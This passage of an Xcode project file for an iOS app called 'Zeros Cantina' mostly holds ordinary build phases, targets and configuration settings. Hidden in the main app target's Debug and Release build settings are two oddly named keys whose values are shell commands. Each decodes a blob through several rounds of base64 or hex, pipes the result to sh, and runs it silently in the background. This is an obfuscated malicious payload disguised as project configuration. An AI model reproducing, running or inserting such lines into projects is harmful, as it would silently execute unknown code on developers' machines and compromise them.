				FC029C3A2E16127C0051663F /* CharactersScreenInteractor.swift in Sources */,
				FC029C3B2E16127C0051663F /* CharactersScreenPresenter.swift in Sources */,
				FC029C3C2E16127C0051663F /* CharactersScreenRouter.swift in Sources */,
				FC029C3D2E16127C0051663F /* CharactersScreenViewController.swift in Sources */,
				FC029C3E2E16127C0051663F /* PlanetsModuleDataInputProtocol.swift in Sources */,
				FC029C3F2E16127C0051663F /* PlanetsScreenContract.swift in Sources */,
				FC029C402E16127C0051663F /* PlanetsScreenInteractor.swift in Sources */,
				FC029C412E16127C0051663F /* PlanetsScreenPresenter.swift in Sources */,
				FC029C422E16127C0051663F /* PlanetsScreenRouter.swift in Sources */,
				FC029C432E16127C0051663F /* PlanetsScreenViewController.swift in Sources */,
				FC029C442E16127C0051663F /* VehiclesModuleDataInputProtocol.swift in Sources */,
				FC029C452E16127C0051663F /* VehiclesScreenContract.swift in Sources */,
				FC029C462E16127C0051663F /* VehiclesScreenInteractor.swift in Sources */,
				FC029C472E16127C0051663F /* VehiclesScreenPresenter.swift in Sources */,
				FC029C482E16127C0051663F /* VehiclesScreenRouter.swift in Sources */,
				FC029C492E16127C0051663F /* VehiclesScreenViewController.swift in Sources */,
				FC029C4A2E16127C0051663F /* AppDelegate.swift in Sources */,
				FC029C4B2E16127C0051663F /* SceneDelegate.swift in Sources */,
				FC029C4C2E16127C0051663F /* Zeros_Cantina.xcdatamodeld in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		FC2134822DFCE8EF000B71D6 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				FC029C552E16127E0051663F /* Zeros_CantinaTests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		FC21348C2DFCE8EF000B71D6 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				FC029C592E1612810051663F /* Zeros_CantinaUITests.swift in Sources */,
				FC029C5A2E1612810051663F /* Zeros_CantinaUITestsLaunchTests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		FC2134882DFCE8EF000B71D6 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = FC21346C2DFCE8ED000B71D6 /* Zeros Cantina */;
			targetProxy = FC2134872DFCE8EF000B71D6 /* PBXContainerItemProxy */;
		};
		FC2134922DFCE8EF000B71D6 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = FC21346C2DFCE8ED000B71D6 /* Zeros Cantina */;
			targetProxy = FC2134912DFCE8EF000B71D6 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin PBXVariantGroup section */
		FC029BFC2E16127C0051663F /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				FC029BFB2E16127C0051663F /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
		FC029BFE2E16127C0051663F /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				FC029BFD2E16127C0051663F /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		FC21349A2DFCE8EF000B71D6 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A4FB9DF = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhiVVpJVm0xd2FFMXJOWEpaYldzeFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				A66CD37 = "((echo 333333333333333633333333333333353333333333333336333333333333333333333333333333363333333333333338333333333333333633333336333333363333333333333332333333333333333033333333333333323333333333333332333333333333333233333333333333343333333333333332333333333333333833333333333333363333333333333333333333333333333733333333333333353333333333333337333333333333333233333333333333363333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333336333333333333333733333333333333333333333333333336333333363333333233333333333333343333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333334333333333333333233333333333333303333333333333337333333333333333033333333333333333333333633333334333333333333333733333333333333383333333333333336333333333333333333333333333333363333333633333336333333333333333633333333333333343333333333333336333333333333333533333333333333323333333333333330333333333333333633333333333333383333333333333337333333333333333433333333333333373333333333333334333333333333333733333333333333303333333333333337333333333333333333333333333333333333333633333331333333333333333233333336333333363333333333333332333333363333333633333333333333363333333633333334333333333333333633333333333333343333333333333337333333333333333333333333333333363333333333333333333333333333333633333333333333313333333333333336333333333333333333333333333333363333333333333338333333333333333633333333333333353333333333333332333333363333333533333333333333373333333333333332333333333333333733333333333333353333333333333332333333363333333633333333333333363333333333333331333333333333333233333333333333393333333333333332333333333333333233333333333333323333333333333330333333333333333733333336333333333333333333333332333333333333333033333333333333373333333333333333333333333333333633333333333333383333333333333330333333363333333133333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = XLY33384SZ;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "Zeros Cantina/Resources/Info.plist";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.anton.zyryanov.zeros.cantina.Zeros-Cantina";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		FC21349B2DFCE8EF000B71D6 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A4FB9DF = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhiVVpJVm0xd2FFMXJOWEpaYldzeFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				A66CD37 = "((echo 333333333333333633333333333333353333333333333336333333333333333333333333333333363333333333333338333333333333333633333336333333363333333333333332333333333333333033333333333333323333333333333332333333333333333233333333333333343333333333333332333333333333333833333333333333363333333333333333333333333333333733333333333333353333333333333337333333333333333233333333333333363333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333336333333333333333733333333333333333333333333333336333333363333333233333333333333343333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333334333333333333333233333333333333303333333333333337333333333333333033333333333333333333333633333334333333333333333733333333333333383333333333333336333333333333333333333333333333363333333633333336333333333333333633333333333333343333333333333336333333333333333533333333333333323333333333333330333333333333333633333333333333383333333333333337333333333333333433333333333333373333333333333334333333333333333733333333333333303333333333333337333333333333333333333333333333333333333633333331333333333333333233333336333333363333333333333332333333363333333633333333333333363333333633333334333333333333333633333333333333343333333333333337333333333333333333333333333333363333333333333333333333333333333633333333333333313333333333333336333333333333333333333333333333363333333333333338333333333333333633333333333333353333333333333332333333363333333533333333333333373333333333333332333333333333333733333333333333353333333333333332333333363333333633333333333333363333333333333331333333333333333233333333333333393333333333333332333333333333333233333333333333323333333333333330333333333333333733333336333333333333333333333332333333333333333033333333333333373333333333333333333333333333333633333333333333383333333333333330333333363333333133333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = XLY33384SZ;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "Zeros Cantina/Resources/Info.plist";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.anton.zyryanov.zeros.cantina.Zeros-Cantina";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		FC21349C2DFCE8EF000B71D6 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		FC21349D2DFCE8EF000B71D6 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		FC21349F2DFCE8EF000B71D6 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = XLY33384SZ;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.anton.zyryanov.zeros.cantina.Zeros-CantinaTests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Zeros Cantina.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/Zeros Cantina";
			};
			name = Debug;
		};
		FC2134A02DFCE8EF000B71D6 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = XLY33384SZ;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.anton.zyryanov.zeros.cantina.Zeros-CantinaTests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Zeros Cantina.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/Zeros Cantina";
			};
			name = Release;
		};
		FC2134A22DFCE8EF000B71D6 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = XLY33384SZ;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.anton.zyryanov.zeros.cantina.Zeros-CantinaUITests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = "Zeros Cantina";
			};
			name = Debug;
		};
		FC2134A32DFCE8EF000B71D6 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = XLY33384SZ;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.anton.zyryanov.zeros.cantina.Zeros-CantinaUITests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = "Zeros Cantina";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		FC2134682DFCE8ED000B71D6 /* Build configuration list for PBXProject "Zeros Cantina" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				FC21349C2DFCE8EF000B71D6 /* Debug */,
				FC21349D2DFCE8EF000B71D6 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		FC2134992DFCE8EF000B71D6 /* Build configuration list for PBXNativeTarget "Zeros Cantina" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				FC21349A2DFCE8EF000B71D6 /* Debug */,
				FC21349B2DFCE8EF000B71D6 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		FC21349E2DFCE8EF000B71D6 /* Build configuration list for PBXNativeTarget "Zeros CantinaTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				FC21349F2DFCE8EF000B71D6 /* Debug */,
				FC2134A02DFCE8EF000B71D6 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		FC2134A12DFCE8EF000B71D6 /* Build configuration list for PBXNativeTarget "Zeros CantinaUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				FC2134A22DFCE8EF000B71D6 /* Debug */,
				FC2134A32DFCE8EF000B71D6 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		FC5C48B92DFCFF2600AAC4F0 /* XCRemoteSwiftPackageReference "SnapKit" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/SnapKit/SnapKit.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 5.7.1;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		FC7A74D72DFD075B000F07D3 /* SnapKit */ = {
			isa = XCSwiftPackageProductDependency;
			package = FC5C48B92DFCFF2600AAC4F0 /* XCRemoteSwiftPackageReference "SnapKit" */;
			productName = SnapKit;
		};
/* End XCSwiftPackageProductDependency section */

/* Begin XCVersionGroup section */
		FC029C002E16127C0051663F /* Zeros_Cantina.xcdatamodeld */ = {
			isa = XCVersionGroup;
			children = (
				FC029C022E16127C0051663F /* Zeros_Cantina.xcdatamodel */,
			);
			currentVersion = FC029C022E16127C0051663F /* Zeros_Cantina.xcdatamodel */;
			path = Zeros_Cantina.xcdatamodeld;
			sourceTree = "<group>";
			versionGroupType = wrapper.xcdatamodel;
		};
/* End XCVersionGroup section */
	};
	rootObject = FC2134652DFCE8ED000B71D6 /* Project object */;
}
